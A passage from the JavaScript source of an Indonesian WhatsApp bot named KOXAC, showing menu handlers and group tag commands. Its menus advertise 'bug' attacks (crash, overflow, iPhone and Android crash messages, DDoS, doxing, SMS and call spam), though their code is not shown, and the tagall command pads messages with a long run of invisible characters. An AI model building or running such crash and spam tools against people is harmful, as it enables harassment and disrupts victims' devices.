┗──────────────❐​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​
┏─ ⌜ \`KӨXΛᄃ BЦG\` ⌟
│ ㉿ ΉIƬΛM ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ PΛПƬΣK ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ KӨXΛᄃ ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ PЦKIMΛK ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ IPΉӨПΣ ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ XIӨƧ ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ XΛПDЯӨ ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ ΛƬƬΛᄃK ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ ӨVΣЯFᄂӨЩ ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ VΛƧIӨП ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ ᄃЯΛƧΉFᄂӨЩ ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ ПΛJIƧ ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ ΣЯЯӨЯ ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ BЦBΛЯ ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ ƧΛDIƧ ⇏✆ɴᴜᴍʙᴇʀ⇍
┗──────────────❐
┏ ⌜\`ƧPΣƧIΛᄂ BЦG KӨXΛᄃ\`⌟
│ ㉿ ΛᄂЩIGΛПƬΣПG ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ GΛᄃӨЯ ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ ΛᄃЦMΛᄂΛKΛ ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ DӨЯ ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ KӨKΉIᄂΛПG ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ XΛᄂЩI ⇏✆ɴᴜᴍʙᴇʀ⇍
┗──────────────❐
┏─ ⌜ \`BЦG ӨЩПΣЯ\` ⌟
│ ㉿ XΛᄂЩI ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ KӨDΣ ӨƬP ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ ƧPΛM ƧMƧ ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ ƧPΛM PΛIЯIПG ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ ƧPΛM ᄃΛᄂᄂ ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ DӨXIПG ⇏✆ɴᴜᴍʙᴇʀ⇍
│ ㉿ DDӨƧ ⇏✆ɴᴜᴍʙᴇʀ⇍
┗─────────────❐`
let sections = [{
title: '╰‿╯  ╰𐌊〇Ⲭᗩᑕ╯  ╰‿╯',
highlight_label: 'AllMenu',
rows: [{
title: '🏴‍☠️ ΛᄂMΣПЦ 🏴‍☠️', 
id: '.allmenu'
}]
},
{
highlight_label: 'BugMenu',
rows: [{
title: '☣️ ΉIƬΛMKΛП ☣️', 
id: '.bugmenu'
}]
},
{
highlight_label: 'StoreMenu',
rows: [{
title: '🛍️ MΣПЦ ƧƬӨЯΣ 🛍️', 
id: '.storemenu'
}]
},
{
highlight_label: 'ToolsMenu',
rows: [{
title: '⚒️ PΣЯΛᄂΛƬΛП ⚒️', 
id: '.toolsmenu'
}]
},
{
highlight_label: 'GrupMenu',
rows: [{
title: '✨ Gᄃ MΣПЦ ✨', 
id: '.groupmenu'
}]
},
{
highlight_label: 'OwnerMenu',
rows: [{
title: '💥 ӨЩПΣЯ MΣПЦ 💥', 
id: '.ownermenu'
}]
}]
let listMessage = {
    title: '╰‿╯  ╰𐌊〇Ⲭᗩᑕ╯  ╰‿╯', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: bugmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Alwi.jpg")}, { upload: zyn.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"JANGAN DITEKAN\",\"url\":\"https://youtube.com/@alwicrash\",\"merchant_url\":\"https://youtube.com/@alwicrash\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'storemenu': {
await loading()
const version = require("baileys/package.json").version
const storemenu = `┏─── ｢ \`𝐊𝐎𝐗𝐀𝐂 𝐍𝐄𝐖 𝟗𝟗𝟗\` ｣ ──❐
┃╔╗╔═╦═══╦═╗╔═╗
┃║║║╔╣╔═╗╠╗╚╝╔╝
┃║╚╝╝║║─║║╚╗╔╝
┃║╔╗║║║─║║╔╝╚╗
┃║║║╚╣╚═╝╠╝╔╗╚╗
┃╚╝╚═╩═══╩═╝╚═╝
┃╔═══╦═══╗
┃║╔═╗║╔═╗║
┃║║─║║║─╚╝
┃║╚═╝║║─╔╗
┃║╔═╗║╚═╝║
┃╚╝─╚╩═══╝
┃🌐 ПΛMΛ : _*${pushname}*_
┃🤖 BӨƬ : _*${namabot}*_
┃🧑🏻‍💻 DΣV : _*${namaCreator}*_
┃📲 VΣЯƧIӨП : _*${versisc}*_
┃👁️‍🗨️ ЯЦПƬIMΣ : _*${run}*_
┗──────────────❐​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​
┏─『 \`ƧƬӨЯΣ MΣПЦ\` 』
│ ㉿ PΛYMΣПƬ
│ ㉿ DΛПΛMΛƧЦK
│ ㉿ PЯӨƧΣƧ
│ ㉿ DӨПΣ
│ ㉿ JPMPЯӨMӨƧI
│ ㉿ JPM3
│ ㉿ ᄂIƧƬ ΛDD
│ ㉿ ᄂIƧƬDΣᄂᄂ
│ ㉿ IƧƬЦPDΛƬΣ
│ ㉿ JΣDΛ
┗─────────────❐`
let sections = [{
title: '╰‿╯  ╰𐌊〇Ⲭᗩᑕ╯  ╰‿╯',
highlight_label: 'AllMenu',
rows: [{
title: '🏴‍☠️ ΛᄂMΣПЦ 🏴‍☠️', 
id: '.allnenu'
}]
},
{
highlight_label: 'BugMenu',
rows: [{
title: '☣️ ΉIƬΛMKΛП ☣️', 
id: '.bugmenu'
}]
},
{
highlight_label: 'StoreMenu',
rows: [{
title: '🛍️ MΣПЦ ƧƬӨЯΣ 🛍️', 
id: '.storemenu'
}]
},
{
highlight_label: 'ToolsMenu',
rows: [{
title: '⚒️ PΣЯΛᄂΛƬΛП ⚒️', 
id: '.toolsmenu'
}]
},
{
highlight_label: 'GrupMenu',
rows: [{
title: '✨ Gᄃ MΣПЦ ✨', 
id: '.groupmenu'
}]
},
{
highlight_label: 'OwnerMenu',
rows: [{
title: '💥 ӨЩПΣЯ MΣПЦ 💥', 
id: '.ownermenu'
}]
}]
let listMessage = {
    title: '╰‿╯  ╰𐌊〇Ⲭᗩᑕ╯  ╰‿╯', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: storemenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Alwi.jpg")}, { upload: zyn.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"JANGAN DITEKAN\",\"url\":\"https://youtube.com/@alwicrash\",\"merchant_url\":\"https://youtube.com/@alwicrash\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'ownermenu': {
await loading()
const version = require("baileys/package.json").version
const ownermenu = `┏─── ｢ \`𝐊𝐎𝐗𝐀𝐂 𝐍𝐄𝐖 𝟗𝟗𝟗\` ｣ ──❐
┃╔╗╔═╦═══╦═╗╔═╗
┃║║║╔╣╔═╗╠╗╚╝╔╝
┃║╚╝╝║║─║║╚╗╔╝
┃║╔╗║║║─║║╔╝╚╗
┃║║║╚╣╚═╝╠╝╔╗╚╗
┃╚╝╚═╩═══╩═╝╚═╝
┃╔═══╦═══╗
┃║╔═╗║╔═╗║
┃║║─║║║─╚╝
┃║╚═╝║║─╔╗
┃║╔═╗║╚═╝║
┃╚╝─╚╩═══╝
┃🌐 ПΛMΛ : _*${pushname}*_
┃🤖 BӨƬ : _*${namabot}*_
┃🧑🏻‍💻 DΣV : _*${namaCreator}*_
┃📲 VΣЯƧIӨП : _*${versisc}*_
┃👁️‍🗨️ ЯЦПƬIMΣ : _*${run}*_
┗──────────────❐

┏─『 \`ӨЩПΣЯ MΣПЦ\` 』
│ ㉿ ΛDDӨЩПΣЯ
│ ㉿ ΛDDPЯΣM
│ ㉿ DΣᄂᄂӨЩПΣЯ
│ ㉿ DΣᄂᄂPЯΣM
│ ㉿ PЦBᄂIᄃ
│ ㉿ ƧΣᄂF
│ ㉿ ƧƬIᄃKΣЯ
│ ㉿ ƬӨIMG 
│ ㉿ ƬӨVID
┗─────────────❐`
let sections = [{
title: '╰‿╯  ╰𐌊〇Ⲭᗩᑕ╯  ╰‿╯',
highlight_label: 'AllMenu',
rows: [{
title: '🏴‍☠️ ΛᄂMΣПЦ 🏴‍☠️', 
id: '.allmenu'
}]
},
{
highlight_label: 'BugMenu',
rows: [{
title: '☣️ ΉIƬΛMKΛП ☣️', 
id: '.bugmenu'
}]
},
{
highlight_label: 'StoreMenu',
rows: [{
title: '🛍️ MΣПЦ ƧƬӨЯΣ 🛍️', 
id: '.storemenu'
}]
},
{
highlight_label: 'ToolsMenu',
rows: [{
title: '⚒️ PΣЯΛᄂΛƬΛП ⚒️', 
id: '.toolsmenu'
}]
},
{
highlight_label: 'GrupMenu',
rows: [{
title: '✨ Gᄃ MΣПЦ ✨', 
id: '.groupmenu'
}]
},
{
highlight_label: 'OwnerMenu',
rows: [{
title: '💥 ӨЩПΣЯ MΣПЦ 💥', 
id: '.ownermenu'
}]
}]
let listMessage = {
    title: '╰‿╯  ╰𐌊〇Ⲭᗩᑕ╯  ╰‿╯', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: `
██╗░░██╗
██║░██╔╝
█████═╝░
██╔═██╗░
██║░╚██╗
╚═╝░░╚═╝

░█████╗░
██╔══██╗
██║░░██║
██║░░██║
╚█████╔╝
░╚════╝░

██╗░░██╗
╚██╗██╔╝
░╚███╔╝░
░██╔██╗░
██╔╝╚██╗
╚═╝░░╚═╝

░█████╗░
██╔══██╗
███████║
██╔══██║
██║░░██║
╚═╝░░╚═╝

░█████╗░
██╔══██╗
██║░░╚═╝
██║░░██╗
╚█████╔╝
░╚════╝░`
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Alwi.jpg")}, { upload: zyn.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"LIST MENUNYA\",\"url\":\"https://a.top4top.io/p_3206wxmf91.jpg\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'toolsmenu': {
await loading()
const version = require("baileys/package.json").version
const toolsmenu = `┏─── ｢ \`𝐊𝐎𝐗𝐀𝐂 𝐍𝐄𝐖 𝟗𝟗𝟗\` ｣ ──❐
┃╔╗╔═╦═══╦═╗╔═╗
┃║║║╔╣╔═╗╠╗╚╝╔╝
┃║╚╝╝║║─║║╚╗╔╝
┃║╔╗║║║─║║╔╝╚╗
┃║║║╚╣╚═╝╠╝╔╗╚╗
┃╚╝╚═╩═══╩═╝╚═╝
┃╔═══╦═══╗
┃║╔═╗║╔═╗║
┃║║─║║║─╚╝
┃║╚═╝║║─╔╗
┃║╔═╗║╚═╝║
┃╚╝─╚╩═══╝
┃🌐 ПΛMΛ : _*${pushname}*_
┃🤖 BӨƬ : _*${namabot}*_
┃🧑🏻‍💻 DΣV : _*${namaCreator}*_
┃📲 VΣЯƧIӨП : _*${versisc}*_
┃👁️‍🗨️ ЯЦПƬIMΣ : _*${run}*_
┗──────────────❐
┏─『 \`PΣЯΛᄂΛƬΛП\` 』
│ ㉿ ΣПᄃ <ᄃӨDΣ>
│ ㉿ ΣПᄃЯYPƬ <ᄃӨDΣ>
│ ㉿ ӨBFЦƧᄃΛƬΣ
│ ㉿ ΛI <ƬΣXƬ>
│ ㉿ ΉIDΣƬΛG <ƬΣXƬ>
│ ㉿ ƬΛGΛᄂᄂ
│ ㉿ Qᄃ
│ ㉿ ƧΣƬӨЩПΣЯ
│ ㉿ ƬӨΉD
┗─────────────❐`
let sections = [{
title: '╰‿╯  ╰𐌊〇Ⲭᗩᑕ╯  ╰‿╯',
highlight_label: 'AllMenu',
rows: [{
title: '🏴‍☠️ ΛᄂMΣПЦ 🏴‍☠️', 
id: '.allmenu'
}]
},
{
highlight_label: 'BugMenu',
rows: [{
title: '☣️ ΉIƬΛMKΛП ☣️', 
id: '.bugmenu'
}]
},
{
highlight_label: 'StoreMenu',
rows: [{
title: '🛍️ MΣПЦ ƧƬӨЯΣ 🛍️', 
id: '.storemenu'
}]
},
{
highlight_label: 'ToolsMenu',
rows: [{
title: '⚒️ PΣЯΛᄂΛƬΛП ⚒️', 
id: '.toolsmenu'
}]
},
{
highlight_label: 'GrupMenu',
rows: [{
title: '✨ Gᄃ MΣПЦ ✨', 
id: '.groupmenu'
}]
},
{
highlight_label: 'OwnerMenu',
rows: [{
title: '💥 ӨЩПΣЯ MΣПЦ 💥', 
id: '.ownermenu'
}]
}]
let listMessage = {
    title: '╰‿╯  ╰𐌊〇Ⲭᗩᑕ╯  ╰‿╯', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: toolsmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Alwi.jpg")}, { upload: zyn.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"JANGAN DITEKAN\",\"url\":\"https://youtube.com/@alwicrash\",\"merchant_url\":\"https://youtube.com/@alwicrash\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'groupmenu': {
await loading()
const version = require("baileys/package.json").version
const groupmenu = `┏─── ｢ \`𝐊𝐎𝐗𝐀𝐂 𝐍𝐄𝐖 𝟗𝟗𝟗\` ｣ ──❐
┃╔╗╔═╦═══╦═╗╔═╗
┃║║║╔╣╔═╗╠╗╚╝╔╝
┃║╚╝╝║║─║║╚╗╔╝
┃║╔╗║║║─║║╔╝╚╗
┃║║║╚╣╚═╝╠╝╔╗╚╗
┃╚╝╚═╩═══╩═╝╚═╝
┃╔═══╦═══╗
┃║╔═╗║╔═╗║
┃║║─║║║─╚╝
┃║╚═╝║║─╔╗
┃║╔═╗║╚═╝║
┃╚╝─╚╩═══╝
┃🌐 ПΛMΛ : _*${pushname}*_
┃🤖 BӨƬ : _*${namabot}*_
┃🧑🏻‍💻 DΣV : _*${namaCreator}*_
┃📲 VΣЯƧIӨП : _*${versisc}*_
┃👁️‍🗨️ ЯЦПƬIMΣ : _*${run}*_
┗──────────────❐
┏─『 \`Gᄃ MΣПЦ\` 』
│ ㉿ ΉIDΣƬΛG <ƬΣXƬ>
│ ㉿ ƬΛGΛᄂᄂ
│ ㉿ KIᄃK <ƬΛG> 
│ ㉿ PЯӨMӨƬΣ <ƬΛG>
│ ㉿ DΣMӨƬΣ <ƬΛG> 
│ ㉿ ƧΣƬ PP
│ ㉿ ƧΣƬ DΣƧK
│ ㉿ ƧΣƬ ПΛMΣ
│ ㉿ ᄃᄂӨƧΣGЯӨЦP
│ ㉿ ӨPΣПGЯӨЦP
┗─────────────❐`
let sections = [{
title: '╰‿╯  ╰𐌊〇Ⲭᗩᑕ╯  ╰‿╯',
highlight_label: 'AllMenu',
rows: [{
title: '🏴‍☠️ ΛᄂMΣПЦ 🏴‍☠️', 
id: '.allmenu'
}]
},
{
highlight_label: 'BugMenu',
rows: [{
title: '☣️ ΉIƬΛMKΛП ☣️', 
id: '.bugmenu'
}]
},
{
highlight_label: 'StoreMenu',
rows: [{
title: '🛍️ MΣПЦ ƧƬӨЯΣ 🛍️', 
id: '.storemenu'
}]
},
{
highlight_label: 'ToolsMenu',
rows: [{
title: '⚒️ PΣЯΛᄂΛƬΛП ⚒️', 
id: '.toolsmenu'
}]
},
{
highlight_label: 'GroupMenu',
rows: [{
title: '✨ Gᄃ MΣПЦ ✨', 
id: '.groupmenu'
}]
},
{
highlight_label: 'OwnerMenu',
rows: [{
title: '💥 ӨЩПΣЯ MΣПЦ 💥', 
id: '.ownermenu'
}]
}]
let listMessage = {
    title: '╰‿╯  ╰𐌊〇Ⲭᗩᑕ╯  ╰‿╯', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: `
██╗░░██╗
██║░██╔╝
█████═╝░
██╔═██╗░
██║░╚██╗
╚═╝░░╚═╝

░█████╗░
██╔══██╗
██║░░██║
██║░░██║
╚█████╔╝
░╚════╝░

██╗░░██╗
╚██╗██╔╝
░╚███╔╝░
░██╔██╗░
██╔╝╚██╗
╚═╝░░╚═╝

░█████╗░
██╔══██╗
███████║
██╔══██║
██║░░██║
╚═╝░░╚═╝

░█████╗░
██╔══██╗
██║░░╚═╝
██║░░██╗
╚█████╔╝
░╚════╝░`
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: ''
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Alwi.jpg")}, { upload: zyn.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"LIST MENUNYA\",\"url\":\"https://k.top4top.io/p_3206z7x3p1.jpg\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await zyn.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'z': case 'hidetag':
//if (!isRegistered) return registerbut(noregis)
if (!isOwner) return reply(mess.only.owner)
if (!text) return reply(`Teks?`)
zyn.sendMessage(m.chat, { text : text ? text : '' , mentions: participants.map(a => a.id)}, { quoted: m })
break

case "tagall": {
if (!isOwner && !isAdmins) return reply(mess.admin)
if (!isGroup) return joreply(mess.only.group)
if (!q) return reply(`Teks Nya Mana Kak?`)
let teks = `${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎